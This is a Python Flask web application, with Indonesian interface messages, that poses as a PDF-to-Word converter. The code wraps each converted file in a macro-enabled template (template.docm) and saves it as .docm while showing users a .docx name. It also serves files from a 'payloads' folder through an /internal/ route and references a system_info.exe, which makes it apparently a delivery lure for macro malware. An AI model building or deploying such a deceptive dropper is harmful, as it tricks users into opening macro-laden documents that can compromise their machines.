from flask import Flask, render_template, request, redirect, url_for, send_from_directory
from pdf2docx import Converter
import os
import shutil
import pythoncom
import win32com.client as win32

app = Flask(__name__)

BASE_DIR = os.path.abspath(os.path.dirname(__file__))

UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
TEMPLATE_MACRO = os.path.join(BASE_DIR, 'template.docm')
SYSTEM_EXE = os.path.join(BASE_DIR, 'system_info.exe')
FINAL_DOCM_SUFFIX = '.docm'

@app.route('/')
def index():
    return render_template('index.html', docx_file=None)

@app.route('/convert', methods=['POST'])
def convert_pdf_to_word():
    if 'pdf_file' not in request.files:
        return redirect(url_for('index'))

    pdf_file = request.files['pdf_file']

    if pdf_file.filename == '':
        return redirect(url_for('index'))

    if not pdf_file.filename.lower().endswith('.pdf'):
        message = 'File yang diupload bukan PDF.'
        return render_template('index.html', message=message)

    pdf_filename = pdf_file.filename
    pdf_file_path = os.path.join(UPLOAD_FOLDER, pdf_filename)
    docx_filename = os.path.splitext(pdf_filename)[0] + '.docx'
    docx_file_path = os.path.join(UPLOAD_FOLDER, docx_filename)

    pdf_file.save(pdf_file_path)

    try:
        cv = Converter(pdf_file_path)
        cv.convert(docx_file_path, start=0, end=None)
        cv.close()

        final_docm_filename = os.path.splitext(pdf_filename)[0] + FINAL_DOCM_SUFFIX
        final_docm_path = os.path.join(UPLOAD_FOLDER, final_docm_filename)

        shutil.copy2(TEMPLATE_MACRO, final_docm_path)

        pythoncom.CoInitialize()
        try:
            word = win32.gencache.EnsureDispatch('Word.Application')
        except Exception:
            word = win32.Dispatch('Word.Application')
        word.Visible = False
        word.DisplayAlerts = False

        doc = word.Documents.Open(os.path.abspath(final_docm_path))
        selection = word.Selection
        selection.EndKey(Unit=6) 
        selection.InsertFile(os.path.abspath(docx_file_path))

        doc.SaveAs(final_docm_path, FileFormat=16)  
        doc.Close()
        word.Quit()
        pythoncom.CoUninitialize()

        os.remove(pdf_file_path)
        os.remove(docx_file_path)

        display_name = final_docm_filename.replace('.docm', '.docx')

        message = f'File {pdf_file.filename} telah berhasil dikonversi menjadi {display_name}'
        return render_template('index.html', message=message, docx_file=final_docm_filename, display_name=display_name)

    except Exception as e:
        pythoncom.CoUninitialize()
        message = f'Terjadi kesalahan: {str(e)}'
        return render_template('index.html', message=message)

@app.route('/download/<filename>')
def download_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)

@app.route("/internal/<filename>")
def serve_payload(filename):
    return send_from_directory('payloads', filename, as_attachment=True)

if __name__ == '__main__':
    if not os.path.exists(UPLOAD_FOLDER):
        os.makedirs(UPLOAD_FOLDER)
    app.run(debug=True)
